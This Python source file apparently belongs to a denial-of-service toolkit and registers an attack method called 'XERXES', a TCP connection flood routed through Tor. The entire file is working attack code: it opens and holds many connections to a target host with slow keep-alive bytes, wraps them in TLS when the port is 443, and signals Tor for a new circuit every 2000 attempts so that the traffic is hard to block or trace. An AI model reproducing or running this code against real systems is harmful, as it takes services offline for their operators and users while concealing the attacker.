'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import time, socket, ssl
from python_socks.sync import Proxy
from python_socks._errors import ProxyTimeoutError, ProxyConnectionError
from random import uniform
from urllib.parse import urlparse
from stem import Signal
from stem.control import Controller
from src.core import Core
from src.utils import *
from src.useragent import *

def new_identity() -> None:
    '''
    Changes the current TOR circuit, and changes the exit node with that too
    '''

    with Controller.from_port(port=9052) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

def flood(attack_id, url, stoptime) -> None:

    if not Core.target_host: Core.target_host = urlparse(url).netloc # set host if not already set
    if not Core.target_port: Core.target_port = urlparse(url).port if urlparse(url).port else 80 # set port if not already set
    
    if not Core.is_tor_active: # TOR dead? (re)launch it
        utils().launch_tor()
        Core.is_tor_active = True

    socket = None
    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        if Core.change_identity >= 2000: # if the counter reaches 2000, we change the TOR identity/circuit
            Core.change_identity = 0 # reset
            new_identity()
            Core.infodict[attack_id]['identities_changed'] += 1

        try:

            if not socket:
                proxy = Proxy.from_url('socks5://127.0.0.1:9050')
                socket = proxy.connect(Core.target_host, Core.target_port) # connect

                if Core.target_port == 443: # if the port is HTTPS (HTTP over SSL/TLS), wrap the socket
                    socket = ssl.create_default_context().wrap_socket(
                        sock=socket,
                        server_hostname=Core.target_host
                    )

                Core.infodict[attack_id]['conn_opened'] += 1 # count a new connection

            try:
                socket.sendall(b'\0') # send a tiiiiny bit of data to keep the connection open

                Core.infodict[attack_id]['req_sent'] += 1
                time.sleep(uniform(3,6))
            except Exception: #as e:
                #print(f' - Failed to send tiny byte of data, closing connection: {str(e).rstrip()}')
                socket.close() # close connection
                socket = None # reset the socket variable

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['total'] += 1
        Core.change_identity += 1

    socket.close() # close the socket, incase it was still open

    Core.threadcount -= 1

Core.methods.update({
    'XERXES': {
        'info': 'TCP connection flood, abusing the TOR network',
        'func': flood
    }
})